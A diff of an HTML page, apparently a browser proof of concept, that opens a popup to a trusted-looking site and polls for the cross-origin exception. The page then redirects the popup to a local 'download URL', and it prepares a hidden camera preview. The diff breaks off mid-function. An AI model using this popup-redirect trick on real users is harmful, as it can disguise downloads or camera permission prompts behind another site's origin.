@@ -1,14 +1,74 @@
-<script>
-    function next() {
-            w.location.href="http://localhost:3000/301.php";
-          }
-
-
-    function f() {
-      w = window.open("");
-      w.location = "https://abc.xyz"
-      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1)
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Open popup + camera permission</title>
+  <style>
+    /* small niceties */
+    #cameraPreview {
+      position: fixed;
+      right: 10px;
+      bottom: 10px;
+      width: 160px;
+      height: 120px;
+      border: 1px solid #ccc;
+      background: #000;
+      display: none;
+      z-index: 9999;
     }
-  </script>
+    #openBtn {
+      padding: 8px 12px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <a href="#" id="openBtn">Click me</a>
 
-  <a href="#" onclick="f()">click me</a>
+  <!-- hidden video element for camera preview -->
+  <video id="cameraPreview" autoplay muted playsinline></video>
+
+  <script>
+    // target download URL used when popup is ready to be redirected
+    const DOWNLOAD_URL = 'http://localhost:3000/301.php';
+
+    // next() - navigates popup to download URL
+    function next() {
+      if (w && !w.closed) {
+        try {
+          w.location.href = DOWNLOAD_URL;
+        } catch (e) {
+          // If even assigning throws (very rare), try opening a new page
+          w = window.open(DOWNLOAD_URL, '_blank');
+        }
+      } else {
+        // fallback if popup was closed
+        window.open(DOWNLOAD_URL, '_blank');
+      }
+    }
+
+    // Open popup and start polling its location. Polling interval = 100ms (not 1ms).
+    function openPopupAndWatch() {
+      // open a blank popup first (some browsers block popups unless opened in user gesture)
+      w = window.open('', '_blank');
+      // navigate it to the cross-origin page
+      w.location = 'https://abc.xyz';
+
+      // poll the popup; when cross-origin access throws, call next()
+      const intervalMs = 100;
+      const poll = setInterval(function () {
+        try {
+          // trying to read location.href of cross-origin window will throw DOMException
+          // when it's cross-origin; the exception is the signal we want
+          const x = w.location.href;
+          // if it DOES succeed (same-origin), you could do other checks here
+        } catch (err) {
+          clearInterval(poll);
+          next();
+        }
+      }, intervalMs);
+    }
+
+    // stop camera stream and hide preview
+    function stopCamera(stream) {
+      if (!stre
